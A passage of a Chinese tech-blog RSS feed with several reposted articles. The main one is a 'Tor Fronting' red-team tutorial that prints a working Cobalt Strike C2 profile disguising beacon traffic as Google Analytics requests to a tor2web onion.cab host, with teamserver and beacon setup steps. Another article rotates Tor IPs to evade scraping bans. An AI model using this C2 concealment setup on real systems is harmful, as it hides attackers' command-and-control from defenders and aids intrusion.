    <span class="token keyword">with</span> Controller<span class="token punctuation">.</span>from_port<span class="token punctuation">(</span>port <span class="token operator">=</span> <span class="token number">9051</span><span class="token punctuation">)</span> <span class="token keyword">as</span> controller<span class="token punctuation">:</span>
        controller<span class="token punctuation">.</span>authenticate<span class="token punctuation">(</span>password<span class="token operator">=</span><span class="token string">"password"</span><span class="token punctuation">)</span>
        controller<span class="token punctuation">.</span>signal<span class="token punctuation">(</span>Signal<span class="token punctuation">.</span>NEWNYM<span class="token punctuation">)</span> 
</code></pre>
<blockquote>
<p>注意：</p>
<ul>
<li>需要更换IP的时候，需要重新新建Session对象</li>
<li>使用stem包，要求必须设施密码(修改配置文件:ControlPort和HashedControlPassword)</li>
</ul>
</blockquote>
<h4><a id="Tor_IP_107"></a>关于更换Tor IP</h4>
<blockquote>
<p>亲测最简单也最有效的切换IP方式就是<font color="red"><strong>直接重启</strong> </font></p>
<pre><code class="prism language-python"><span class="token keyword">import</span> os
os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'sudo /etc/init.d/tor restart'</span><span class="token punctuation">)</span>
</code></pre>
</blockquote>
<h3><a id="_117"></a>总结</h3>
<blockquote>
<ol>
<li>我们可以使用Tor网站，解决一些网站的IP封禁问题</li>
<li>Tor网络请求数据会经过多次转发， 且服务器大多位于国外，导致请求速度慢，如果一次请求数据太多，并不建议使用Tor网络作为代理</li>
<li>Tor可用的出口节点IP不多</li>
<li>使用Tor网络作为代理，可以访问‘暗网’数据</li>
</ol>
</blockquote>
<p>文档仅作学习和记录使用，请不要用于商业和违法用途，如有侵权，请告知删除。</p>
</p></div>
<link href="https://csdnimg.cn/release/phoenix/mdeditor/markdown_views-e9f16cbbc2.css" rel="stylesheet">
</div>
]]></content:encoded>
										</item>
		<item>
		<title>【基础篇】————23、隐匿攻击之Tor Fronting</title>
		<link>https://uzzz.org/article/1167.html</link>
				<pubDate>Mon, 27 May 2019 06:54:07 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[技术]]></category>

		<guid isPermaLink="false">http://wp.uzzz.org/article/1167.html</guid>
				<description><![CDATA[0x01 简介 学习完Domain Fronting之后，又从@vysecurity的文章里学会了一个新的姿势–Tor Fronting,使用Tor Fronting 同样能在攻击中隐藏自己，并且更加容易实现，此文就来介绍一下这个新的姿势。 0x02 Tor Hidden Services Tor是互联网上用于保护您隐私最有力的工具之一，而Tor Hidden Services则是为了隐藏自己的网站或者其他服务的一个服务。通过此服务，我们可以获取到一个通过Tor Browser来访问的Hostname，此Hostname唯一且匿名，所以我们完全可以使用这个Hostname来为我们转发流量从而达到隐匿的目的。 怎样搭建Tor Hidden Services可以参考此wiki，下面介绍一下我测试环境的搭建过程。 环境为：Ubuntu 12.04 搭建过程如下： 查看系统信息: lsb_release -a 可以看到Codename为precise，所以在这里选择deb类型如下： 之后按照官方wiki修改更新源，我的源路径为/etc/apt/sources.list，有的系统更新源路径可能在/etc/apt/sources.list.d/，在源中添加以下条目： deb http://deb.torproject.org/torproject.org precise main deb-src http://deb.torproject.org/torproject.org precise main 之后执行以下命令: gpg &#8211;keyserver keys.gnupg.net &#8211;recv A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 gpg &#8211;export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 &#124; sudo apt-key add &#8211; 安装： $ sudo apt-get update $ sudo apt-get install tor deb.torproject.org-keyring 执行完成以后，就成功安装了，如果出现问题，可以查看一下wiki。 之后要对tor进行一下配置，编辑配置文件/etc/tor/torrc，将以下两个参数前的注释去掉。 HiddenServiceDir /var/lib/tor/hidden_service/ HiddenServicePort 80 127.0.0.1:8080 HiddenServicePort为代理的端口，将本地的8080端口服务转发到80端口。 配置完成以后对Tor服务进行重启： sudo service tor restart 查看获取到的hostname: sudo cat /var/lib/tor/hidden_service/hostname 其中xxxxx.onion则为我们的Tor隐藏服务。通过访问这个地址，可以访问到我们服务器8080端口的服务，下面进行一下测试。 开启8080端口的服务： ☁ &#160;~ &#160;cd /tmp ☁ &#160;~ &#160;python -m SimpleHTTPServer 8080 Serving HTTP on 0.0.0.0 port 8080 &#8230; 使用tor浏览器访问此域名，可看到8080端口的响应： 0x03 Tor2Web 要对这个隐藏server进行利用，需要借助于一个代理，即tor2web，因为要想访问到隐藏服务，直接通过一般浏览器是不行的，所以，可以借助于tor2web，需要做的也很简单，当我们访问形如http://duskgytldkxiuqc6.onion/的链接时，直接修改.onion成.onion.to或.onion.city&#160;或&#160;onion.cab&#160;或者任何一个提供此服务的域名即可。如下图： 当然，这里会有一个问题，就是访问的时候，会需要我们点击一个按钮才能正常访问，如下图： 那么怎么样才能直接访问呢，很简单，只需要带上点击以后的cookie就可以了，测试如下： curl -b &#8216;onion_cab_iKnowShit=yourcookie&#8217; &#160;&#8216;https://xxxx.onion.cab/1.txt&#8217; 0x04 Cobalt Strike 同样的，我们使用Cobalt Strike来进行测试。这里需要配置一个新的profile，@vysecurity已经提供了一个，具体如下： tor-fronting.profile # make our C2 look like a Google Web Bug # https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting # # Author: @armitagehacker # Modified by Vincent Yiu @vysecurity for TOR. set sleeptime "5000"; http-get { set uri "/___utm"; client { header "Host" "bjaw6h36vwruhwvb.onion.cab"; header "Cookie" "onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d"; metadata { base64url; prepend "__utma"; parameter "utmcc"; } } server { header "Content-Type" "plain/text"; output { # hexdump pixel.gif # 0000000 47 49 46 38 39 61 01 00]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
<div class="htmledit_views" id="content_views">
<h2 id="0x01-简介">0x01 简介</h2>
<p>学习完<a href="https://evi1cg.github.io/archives/Domain_Fronting.html" rel="nofollow" data-token="eb107eac0fca4364da40af2938e886c2">Domain Fronting</a>之后，又从<a href="https://twitter.com/vysecurity" rel="nofollow" data-token="5ccde2f1eb2ecb38c54eaf3af0efe8e2">@vysecurity</a>的文章里学会了一个新的姿势–<code>Tor Fronting</code>,使用Tor Fronting<br /> 同样能在攻击中隐藏自己，并且更加容易实现，此文就来介绍一下这个新的姿势。</p>
<h2 id="0x02-Tor-Hidden-Services">0x02 Tor Hidden Services</h2>
<p>Tor是互联网上用于保护您隐私最有力的工具之一，而Tor Hidden Services则是为了隐藏自己的网站或者其他服务的一个服务。通过此服务，我们可以获取到一个通过Tor Browser来访问的Hostname，此Hostname唯一且匿名，所以我们完全可以使用这个Hostname来为我们转发流量从而达到隐匿的目的。</p>
<p>怎样搭建Tor Hidden Services可以参考此<a href="https://www.torproject.org/docs/tor-hidden-service.html.en" rel="nofollow" data-token="95e911659c63618e646551b0ebcc181a">wiki</a>，下面介绍一下我测试环境的搭建过程。<br /> 环境为：Ubuntu 12.04<br /> 搭建过程如下：<br /> 查看系统信息:</p>
<p>lsb_release -a<br /><img alt="" class="has" height="240" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527144756665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="847"></p>
<p>可以看到Codename为precise，所以在<a href="https://www.torproject.org/docs/debian.html.en#ubuntu" rel="nofollow" data-token="bdd936a67ab3f827137d2d394d965470">这里</a>选择deb类型如下：</p>
<p><img alt="" class="has" height="422" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527144814252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="893"></p>
<p>之后按照官方wiki修改更新源，我的源路径为<code>/etc/apt/sources.list</code>，有的系统更新源路径可能在<code>/etc/apt/sources.list.d/</code>，在源中添加以下条目：</p>
<blockquote>
<p>deb http://deb.torproject.org/torproject.org precise main<br /> deb-src http://deb.torproject.org/torproject.org precise main</p>
</blockquote>
<p><img alt="" class="has" height="285" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527144845444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="907"></p>
<p>之后执行以下命令:</p>
<blockquote>
<p>gpg &#8211;keyserver keys.gnupg.net &#8211;recv A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89<br /> gpg &#8211;export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | sudo apt-key add &#8211;</p>
</blockquote>
<p>安装：</p>
<blockquote>
<p>$ sudo apt-get update<br /> $ sudo apt-get install tor deb.torproject.org-keyring</p>
</blockquote>
<p>执行完成以后，就成功安装了，如果出现问题，可以查看一下wiki。</p>
<p>之后要对tor进行一下配置，编辑配置文件<code>/etc/tor/torrc</code>，将以下两个参数前的注释去掉。</p>
<blockquote>
<p>HiddenServiceDir /var/lib/tor/hidden_service/<br /> HiddenServicePort 80 127.0.0.1:8080</p>
</blockquote>
<blockquote>
<p>HiddenServicePort为代理的端口，将本地的8080端口服务转发到80端口。</p>
</blockquote>
<p>配置完成以后对Tor服务进行重启：</p>
<blockquote>
<pre>
<code class="language-html hljs">sudo service tor restart</code></pre>
</blockquote>
<p>查看获取到的hostname:</p>
<blockquote>
<p>sudo cat /var/lib/tor/hidden_service/hostname</p>
</blockquote>
<p><img alt="" class="has" height="83" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/2019052714501352.png" width="761"></p>
<p>其中<code>xxxxx.onion</code>则为我们的Tor隐藏服务。通过访问这个地址，可以访问到我们服务器8080端口的服务，下面进行一下测试。<br /> 开启8080端口的服务：</p>
<blockquote>
<p><img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/2601.png" alt="☁" class="wp-smiley" style="height: 1em; max-height: 1em;" /> &nbsp;~ &nbsp;cd /tmp<br /> <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/2601.png" alt="☁" class="wp-smiley" style="height: 1em; max-height: 1em;" /> &nbsp;~ &nbsp;python -m SimpleHTTPServer 8080<br /> Serving HTTP on 0.0.0.0 port 8080 &#8230;</p>
</blockquote>
<p>使用tor浏览器访问此域名，可看到8080端口的响应：</p>
<p><img alt="" class="has" height="436" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/2019052714504250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="922"></p>
<h2 id="0x03-Tor2Web">0x03 Tor2Web</h2>
<p>要对这个隐藏server进行利用，需要借助于一个代理，即<a href="https://www.tor2web.org/" rel="nofollow" data-token="681be07496309baccaa7e892f39348bf">tor2web</a>，因为要想访问到隐藏服务，直接通过一般浏览器是不行的，所以，可以借助于tor2web，需要做的也很简单，当我们访问形如<code>http://duskgytldkxiuqc6.onion/</code>的链接时，直接修改<code>.onion</code>成<code>.onion.to</code>或<code>.onion.city</code>&nbsp;或&nbsp;<code>onion.cab</code>&nbsp;或者任何一个提供此服务的域名即可。如下图：</p>
<p><img alt="" class="has" height="310" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145118470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="818"></p>
<p>当然，这里会有一个问题，就是访问的时候，会需要我们点击一个按钮才能正常访问，如下图：</p>
<p><img alt="" class="has" height="431" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145131285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="918"></p>
<p>那么怎么样才能直接访问呢，很简单，只需要带上点击以后的cookie就可以了，测试如下：</p>
<blockquote>
<p>curl -b &#8216;onion_cab_iKnowShit=yourcookie&#8217; &nbsp;&#8216;https://xxxx.onion.cab/1.txt&#8217;</p>
</blockquote>
<p><img alt="" class="has" height="133" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145149374.png" width="887"></p>
<h2 id="0x04-Cobalt-Strike">0x04 Cobalt Strike</h2>
<p>同样的，我们使用Cobalt Strike来进行测试。这里需要配置一个新的profile，@vysecurity已经提供了一个，具体如下：<br /> tor-fronting.profile</p>
<pre class="has">
<code class="language-javascript"># make our C2 look like a Google Web Bug
# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting
#
# Author: @armitagehacker
# Modified by Vincent Yiu @vysecurity for TOR.

set sleeptime "5000";

http-get {
        set uri "/___utm";
        client {
                header "Host" "bjaw6h36vwruhwvb.onion.cab";
                header "Cookie" "onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d";

                metadata {
                        base64url;
                        prepend "__utma";
                        parameter "utmcc";
                }
        }

        server {
                header "Content-Type" "plain/text";

                output {
                        # hexdump pixel.gif
                        # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
                        # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
                        # 0000020 01 00 01 00 00 02 01 44 00 3b
                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";

                        print;
                }
        }
}

http-post {
        set uri "/__utm";
        set verb "GET";
        client {
                header "Host" "bjaw6h36vwruhwvb.onion.cab";
                header "Cookie" "onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d";
                id {
                        prepend "UA-220";
                        append "-2";
                        parameter "utmac";
                }

                output {
                        base64url;
                        prepend "__utma";
                        parameter "utmcc";
                }
        }

        server {
                header "Content-Type" "plain/text";

                output {
                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
                        print;
                }
        }
}

# dress up the staging process too
http-stager {
        server {
                header "Content-Type" "plain/text";
        }
}</code></pre>
<blockquote>
<p>在这里需要注意的是，我们需要修改<code>Get</code>以及<code>Post</code>中的<code>Host</code>及<code>Cookie</code>为自己的。当然，如果你想让数据包呈现别的样子，你也可以自己再写一个profile。</p>
</blockquote>
<p>开启teamserver：</p>
<blockquote>
<p><img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/2601.png" alt="☁" class="wp-smiley" style="height: 1em; max-height: 1em;" /> &nbsp;cobal &nbsp;sudo ./teamserver [your ip] hacktest tor-fronting.profile</p>
</blockquote>
<p><img alt="" class="has" height="210" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145227653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="909"></p>
<p>连接到Teamserver，之后创建监听：</p>
<p><img alt="" class="has" height="471" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145242605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="684"></p>
<blockquote>
<p>因为onion.cab使用的https，所以我们需要生成一个HTTPS Beacon，Host随意输入一个域名，端口<code>一定要改成443</code>。</p>
</blockquote>
<p>使用<code>onion.cab</code>:</p>
<p><img alt="" class="has" height="349" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145257355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="868"></p>
<p>生成HTTPS Beacon：</p>
<p><img alt="" class="has" height="398" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145308626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="641"></p>
<p>生成HTTPS Beacon以后，要修改监听到8080端口，并且使用HTTP，因为这是tor转发的服务。<br /> 选择Edit：</p>
<p><img alt="" class="has" height="262" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145320974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="914"></p>
<p>修改参数如下：</p>
<p><img alt="" class="has" height="447" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190527145331810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="646"></p>
<p>保存之后，运行HTTPS beacon，成功上线：</p>
<p><img alt="" class="has" height="637" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/2019052714534673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" width="910"></p>
<p>DEMO:</p>
<p><a href="https://www.youtube.com/watch?v=I3ovfrqcF0I" rel="nofollow" data-token="94967ae6e858c926e0c57a74c848a5a7">https://www.youtube.com/watch?v=I3ovfrqcF0I</a></p>
<h2 id="0x05-小结">0x05 小结</h2>
<p>使用Tor Fronting 有以下几个特点：<br /> 1、你<code>不需要外网环境</code>，将C2放到Docker或者本地都可以！（但是需要服务器在墙外）<br /> 2、使C2匿名；<br /> 3、并不需要在目标机上安装Tor；<br /> 4、默认是安全的。<br /> 5、要求C2上同时安装Cobalt Strike及Tor服务。<br /> 通过流量转发来隐藏自己的真正服务器是隐藏的关键，而如何寻找转发和怎么样使用它是很有趣的过程，希望文章能给你有所启发。</p>
<h2 id="0x06-参考">0x06 参考</h2>
<p>1、<a href="https://www.torproject.org/docs/tor-hidden-service.html.en" rel="nofollow" data-token="95e911659c63618e646551b0ebcc181a">https://www.torproject.org/docs/tor-hidden-service.html.en</a><br /> 2、<a href="https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/" rel="nofollow" data-token="dbe6cd363165f8f050b421fb1dd34cb4">https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/</a><br /> 3、<a href="https://secureallthethings.blogspot.co.uk/2016/11/use-tor-use-empire.html" rel="nofollow" data-token="0d21987f7212d34bd6f0cc1745ac1aba">https://secureallthethings.blogspot.co.uk/2016/11/use-tor-use-empire.html</a><br /> 4、<a href="https://www.tor2web.org/" rel="nofollow" data-token="681be07496309baccaa7e892f39348bf">https://www.tor2web.org/</a></p>
</p></div>
</div>
]]></content:encoded>
										</item>
		<item>
		<title>centos7.x搭建Tor私人网桥</title>
		<link>https://uzzz.org/article/1189.html</link>
				<pubDate>Mon, 13 May 2019 07:21:24 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[技术]]></category>

		<guid isPermaLink="false">http://wp.uzzz.org/article/1189.html</guid>
				<description><![CDATA[1. 下载并安装 Tor yum install tor -y 2. 安装 obfs4 通过python进行编译安装： （1）安装 所需依赖软件模块： yum install make automake gcc python-pip python-devel libyaml-devel （2）安装 obfs4proxy： pip install obfsproxy 通过go进行编译安装： （1）下载go的obfs4项目： git clone http://www.github.com/Yawning/obfs4 （2）进入obfs4目录进行编译： go build -o obfs4proxy/obfs4proxy ./obfs4proxy （3）复制bofs4proxy到系统工作目录下： cp ./obfs4proxy/obfs4proxy /usr/bin/obfs4proxy 3. 配置 Tor Bridges 编辑&#160;/etc/tor/torrc： vim /etc/tor/torrc 定义一个 ORPort，不作为出口节点，设置成 Bridge： Log notice file /var/log/tor/notices.log RunAsDaemon 1 ORPort 4443 Exitpolicy reject *:* BridgeRelay 1 ServerTransportPlugin obfs4 exec /usr/bin/obfs4proxy ExtORPort auto PublishServerDescriptor 0 重启tor服务： systemctl restart tor 查看tor服务状态 systemctl status tor 4. 使用网桥 查看日志文件，命令： tail -F /var/log/tor/notices.log 内容如下： [notice] Your Tor server's identity key fingerprint is 'Unnamed 530FA95A79B9145D315F15F01215BE2F3BE921EB' [notice] Your Tor bridge's hashed identity key fingerprint is 'Unnamed 83D1AC9EC2F15D7024278461DC91A8B2E9BBF43A' [notice] Registered server transport 'obfs4' at '[::]:46396' [notice] Tor has successfully opened a circuit. Looks like client functionality is working. [notice] Bootstrapped 100%: Done [notice] Now checking whether ORPort &#60;redacted&#62;:4443 is reachable... (this may take up to 20 minutes -- look for log messages indicating success) [notice] Self-testing indicates your ORPort is reachable from the outside. Excellent. 注意：记住输出中 obfs4 监听的端口（本例中是 46396）。并且还能找到你的 server identity fingerprint（本例中是 530FA95A79B9145D315F15F01215BE2F3BE921EB），也复制下来。 在&#160;/var/lib/tor/pt_state/obfs4_bridgeline.txt&#160;文件中可以看到类似如下的内容： Bridge obfs4 &#60;IP ADDRESS&#62;:&#60;PORT&#62; &#60;FINGERPRINT&#62; cert=oG6a3K7CtearIloUp2OCUk60oNMgw+jVgCNhGumMkODS659UEgRRx7yxZuoEo9Crp9GGXg]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
<div class="htmledit_views" id="content_views">
<h3>1. 下载并安装 Tor</h3>
<pre class="has">
<code>yum install tor -y</code></pre>
<h3 id="2-安装-obfs4">2. 安装 obfs4</h3>
<p>通过python进行编译安装：</p>
<ul>
<li>（1）安装 所需依赖软件模块：</li>
</ul>
<pre class="has">
<code class="language-bash">yum install make automake gcc python-pip python-devel libyaml-devel</code></pre>
<ul>
<li>（2）安装 obfs4proxy：</li>
</ul>
<pre class="has">
<code class="language-bash">pip install obfsproxy</code></pre>
<p>通过go进行编译安装：</p>
<ul>
<li>（1）下载go的obfs4项目：</li>
</ul>
<pre class="has">
<code class="language-bash">git clone http://www.github.com/Yawning/obfs4</code></pre>
<ul>
<li>
<p>（2）进入obfs4目录进行编译：</p>
</li>
</ul>
<pre class="has">
<code class="language-bash">go build -o obfs4proxy/obfs4proxy ./obfs4proxy</code></pre>
<ul>
<li>（3）复制bofs4proxy到系统工作目录下：</li>
</ul>
<pre class="has">
<code class="language-bash">cp ./obfs4proxy/obfs4proxy /usr/bin/obfs4proxy</code></pre>
<h3 id="3-配置-tor-bridges">3. 配置 Tor Bridges</h3>
<ul>
<li>编辑&nbsp;/etc/tor/torrc：</li>
</ul>
<pre class="has">
<code class="language-bash">vim /etc/tor/torrc</code></pre>
<ul>
<li>定义一个 ORPort，不作为出口节点，设置成 Bridge：</li>
</ul>
<pre class="has">
<code>Log notice file /var/log/tor/notices.log
RunAsDaemon 1
ORPort 4443
Exitpolicy reject *:*
BridgeRelay 1
ServerTransportPlugin obfs4 exec /usr/bin/obfs4proxy
ExtORPort auto
PublishServerDescriptor 0</code></pre>
<ul>
<li>重启tor服务：</li>
</ul>
<pre class="has">
<code class="language-bash">systemctl restart tor</code></pre>
<ul>
<li>
<p>查看tor服务状态</p>
</li>
</ul>
<pre class="has">
<code>systemctl status tor</code></pre>
<h3 id="4-使用网桥">4. 使用网桥</h3>
<ul>
<li>查看日志文件，命令：</li>
</ul>
<pre class="has">
<code>tail -F /var/log/tor/notices.log</code></pre>
<p>内容如下：</p>
<pre class="has">
<code>[notice] Your Tor server's identity key fingerprint is 'Unnamed 530FA95A79B9145D315F15F01215BE2F3BE921EB'
[notice] Your Tor bridge's hashed identity key fingerprint is 'Unnamed 83D1AC9EC2F15D7024278461DC91A8B2E9BBF43A'
[notice] Registered server transport 'obfs4' at '[::]:46396'
[notice] Tor has successfully opened a circuit. Looks like client functionality is working.
[notice] Bootstrapped 100%: Done
[notice] Now checking whether ORPort &lt;redacted&gt;:4443 is reachable... (this may take up to 20 minutes -- look for log messages indicating success)
[notice] Self-testing indicates your ORPort is reachable from the outside. Excellent.</code></pre>
<p>注意：记住输出中 obfs4 监听的端口（本例中是 46396）。并且还能找到你的 server identity fingerprint（本例中是 530FA95A79B9145D315F15F01215BE2F3BE921EB），也复制下来。</p>
<p>在&nbsp;<code>/var/lib/tor/pt_state/obfs4_bridgeline.txt</code>&nbsp;文件中可以看到类似如下的内容：</p>
<pre class="has">
<code>Bridge obfs4 &lt;IP ADDRESS&gt;:&lt;PORT&gt; &lt;FINGERPRINT&gt; cert=oG6a3K7CtearIloUp2OCUk60oNMgw+jVgCNhGumMkODS659UEgRRx7yxZuoEo9Crp9GGXg iat-mode=0
</code></pre>
<ul>
<li>根据日志中的信息获得最终的网桥配置：</li>
</ul>
<pre class="has">
<code>obfs4 &lt;IP ADDRESS&gt;:46396 530FA95A79B9145D315F15F01215BE2F3BE921EB cert=6LMNcXh6MIfApbZiMksnS4Kj+2sffZ5pybSqtcOO5YoHgfrMpkBJqvLxhuR2Ppau0L2seg iatmode=0</code></pre>
<h3>5. 防火墙firewalld放行端口</h3>
<ul>
<li>编辑防火墙公共配置/etc/firewalld/zones/public.xml文件，命令：</li>
</ul>
<pre class="has">
<code>vim /etc/firewalld/zones/public.xml</code></pre>
<p>&nbsp;内容如下(本例ORPort端口 =&gt; 4443, obfs4端口 =&gt; 46396)：</p>
<pre class="has">
<code>&lt;port protocol="tcp" port="ORPort端口"/&gt;
&lt;port protocol="udp" port="ORPort端口"/&gt;
&lt;port protocol="tcp" port="obfs4端口"/&gt;
&lt;port protocol="udp" port="obfs4端口"/&gt;</code></pre>
<ul>
<li>&nbsp;使防火墙配置生效，命令：</li>
</ul>
<pre class="has">
<code>firewall-cmd --complete-reload</code></pre>
<p>&nbsp;</p>
<p><strong>6. 最后附上官方Tor浏览器下载地址</strong></p>
<p><a href="https://www.torproject.org/download/" rel="nofollow" data-token="b63d923088f578fa1571b56ab5f2b347">https://www.torproject.org/download/</a></p>
</p></div>
</div>
]]></content:encoded>
										</item>
		<item>
		<title>惠普暗影精灵2 Mojave（几乎完美黑苹果）</title>
		<link>https://uzzz.org/article/2065.html</link>
				<pubDate>Sun, 05 May 2019 02:21:39 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[macOS]]></category>
		<category><![CDATA[技术]]></category>
		<category><![CDATA[操作系统]]></category>

		<guid isPermaLink="false">https://uzzz.org/article/2065.html</guid>
				<description><![CDATA[惠普暗影精灵2 Mojave 新的改变 已知BUG Bug修复 1. 电池修复 2. 亮度调节修复正常 **Mac os（Mojave）的镜像百度即可！** Github开源地址 ====传送地址: [Mojave 暗影精灵2](https://github.com/Arecall/-Mac-os).==== 新的改变 2018年6月5日，在2018苹果全球开发者大会上，苹果发布了mac OS Mojave系统。 夜间模式 ，MacOS Mojave的夜间模式，不仅使UI变暗， 还切换壁纸，窗口边框和窗口内容，此外，XCode同样也支持夜间模式。用户可以自行设置夜晚模式，也可以由系统决定随时间自动启动。 桌面堆积，可以通过类型、日期、标签等进行分类，侧栏底部的新快速操作，可快速执行旋转图像等操作。几乎可以在任何文件视图中使用侧边栏。如果选择多个文件，它可以对所有文件执行操作，例如将它们组装成PDF。 画廊视图（Gallery View），可预览图片、视频、PPT、表格、PDF等，侧边栏支持完整元数据，右下角增加快捷工具栏可执行旋转等操作，侧边栏可以在几乎任何文件视图中使用，选择多个文件后可以执行整体操作如生成PDF。 截屏，功能非常丰富，就像在iOS上截图时角落里会出现大拇指图标，点击就会出现快速标记工具。 iOS应用登陆桌面 ，Apple News苹果新闻、Stock股票、Voice Memos语音备忘录、Home家庭都会来到macOS，基本上可以视为iPad版本，为此苹果从iOS上移植过来了一些关键框架。 HomeKit，可以在Mac上添加和管理HomeKit设备，依然支持Siri语音控制。 Quick Look，加入Markup，可以直接把签名拖拽到文档内。 Continuity Camera，可以直接将iPhone里已有或者拍摄的照片直接导入桌面文档，还可以扫描手机上的文档并发送结果。 安全和隐私，任何应用都默认受到保护。Safari减少对用户数据的追踪。网页信息追踪保护默认关闭。加强硬件指纹识别安全等级（iOS 12/macOS Mojave同步）。 应用商店，界面重新设计像iOS商店看齐，增加新的分类包括发现、创建、工作、游戏、开发、分类、更新，增加关于应用的故事（Stories）。 已知BUG WIFI模块不可用 2. 电池DDST有问题，未修复 3. 亮度调节需要外接键盘，使用Fn+亮度调节经行第一次矫正，以后直接使用后电脑键盘deFn+亮度调节。 Bug修复 1. 电池修复 2. 亮度调节修复正常 Mac os（Mojave）的镜像百度即可！ Github开源地址 传送地址: Mojave 暗影精灵2.]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
